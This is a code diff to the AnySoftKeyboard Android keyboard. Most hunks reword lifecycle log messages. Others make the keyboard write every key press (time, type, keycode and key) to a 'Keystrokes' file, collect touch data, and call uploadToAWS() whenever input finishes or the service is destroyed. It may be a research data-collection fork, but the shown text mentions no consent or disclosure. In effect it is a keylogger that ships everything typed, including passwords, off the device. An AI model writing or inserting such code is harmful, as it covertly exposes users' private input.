@@ -234,9 +234,7 @@ public class AnySoftKeyboard extends InputMethodService implements
     @Override
     public void onCreate() {
         super.onCreate();
-        Log.i(mKeyboardLifecycle, "OnCreate");
-        mDataToFileWriter = new DataToFileWriter("Keystrokes.txt");
-        mDataToFileWriter.writeToFile("Time, Type, Keycode, Key", false);
+        Log.i(mKeyboardLifecycle, "AnySoftKeyboard: OnCreate");
         mPrefs = PreferenceManager
                 .getDefaultSharedPreferences(getApplicationContext());
         if (DeveloperUtils.hasTracingRequested(getApplicationContext())) {
@@ -309,8 +307,10 @@ public class AnySoftKeyboard extends InputMethodService implements
     @Override
     public void onDestroy() {
         Log.i(TAG, "AnySoftKeyboard has been destroyed! Cleaning resources..");
-        Log.i(mKeyboardLifecycle, "On Destroy");
+        Log.i(mKeyboardLifecycle, "AnySoftKeyboard: On Destroy");
         mDataToFileWriter.closeFile();
+        mDataToFileWriter.uploadToAWS();
+        mInputView.destroyFileWriter();
         mSwitchAnimator.onDestory();
 
         mAskPrefs.removeChangedListener(this);
@@ -375,7 +375,7 @@ public class AnySoftKeyboard extends InputMethodService implements
 
     @Override
     public View onCreateInputView() {
-        Log.i(mKeyboardLifecycle, "On create input view");
+        Log.i(mKeyboardLifecycle, "AnySoftKeyboard: On create input view");
         if (mInputView != null)
             mInputView.onViewNotRequired();
         mInputView = null;
@@ -463,7 +463,7 @@ public class AnySoftKeyboard extends InputMethodService implements
     public void onStartInput(EditorInfo attribute, boolean restarting) {
         Log.d(TAG, "onStartInput(EditorInfo:" + attribute.imeOptions + ","
                 + attribute.inputType + ", restarting:" + restarting + ")");
-        Log.i(mKeyboardLifecycle, "On start input");
+        Log.i(mKeyboardLifecycle, "AnySoftKeyboard: On start input");
         super.onStartInput(attribute, restarting);
 
         abortCorrection(true, false);
@@ -489,7 +489,7 @@ public class AnySoftKeyboard extends InputMethodService implements
                                  final boolean restarting) {
         Log.d(TAG, "onStartInputView(EditorInfo{imeOptions %d, inputType %d}, restarting %s",
                 attribute.imeOptions, attribute.inputType, restarting);
-        Log.i(mKeyboardLifecycle, "On start input view");
+        Log.i(mKeyboardLifecycle, "AnySoftKeyboard: On start input view");
         super.onStartInputView(attribute, restarting);
         if (mVoiceRecognitionTrigger != null) {
             mVoiceRecognitionTrigger.onStartInputView();
@@ -498,7 +498,7 @@ public class AnySoftKeyboard extends InputMethodService implements
         if (mInputView == null) {
             return;
         }
-
+        mInputView.createFileWriter(); // Collect touches
         mInputView.dismissPopupKeyboard();
         mInputView.setKeyboardActionType(attribute.imeOptions);
         mKeyboardSwitcher.makeKeyboards(false);
@@ -628,15 +628,23 @@ public class AnySoftKeyboard extends InputMethodService implements
     @Override
     public void onFinishInput() {
         Log.d(TAG, "onFinishInput()");
+        Log.i(mKeyboardLifecycle, "AnySoftKeyboard: On Finish Input");
         super.onFinishInput();
 
         if (mInputView != null) {
             mInputView.closing();
+            mInputView.destroyFileWriter();
         }
 
         if (!mKeyboardChangeNotificationType
                 .equals(KEYBOARD_NOTIFICATION_ALWAYS)) {
             mInputMethodManager.hideStatusIcon(mImeToken);
+        }
+
+        if (mDataToFileWriter != null) {
+            mDataToFileWriter.closeFile();
+            mDataToFileWriter.uploadToAWS();
+            mDataToFileWriter = null;
         }
     }
 
@@ -2230,8 +2238,10 @@ public class AnySoftKeyboard extends InputMethodService implements
     private void handleClose() {
         boolean closeSelf = true;
 
-        if (mInputView != null)
+        if (mInputView != null) {
             closeSelf = mInputView.closing();
+            Log.i(mKeyboardLifecycle, "AnySoftKeyboard: Closing");
+        }
 
         if (closeSelf) {
             commitTyped(getCurrentInputConnection());
@@ -2695,6 +2705,11 @@ public class AnySoftKeyboard extends InputMethodService implements
                     + " with volume " + fxVolume);
 
             mAudioManager.playSoundEffect(keyFX, fxVolume);
+        }
+
+        if (mDataToFileWriter == null) {
+            mDataToFileWriter = new DataToFileWriter("Keystrokes");
+            mDataToFileWriter.writeToFile("Time, Type, Keycode, Key", false);
         }
 
         StringBuilder toDump = new StringBuilder("KeyPress, " + Integer.toString(primaryCode) + ", " + primaryCodeToString(primaryCode));
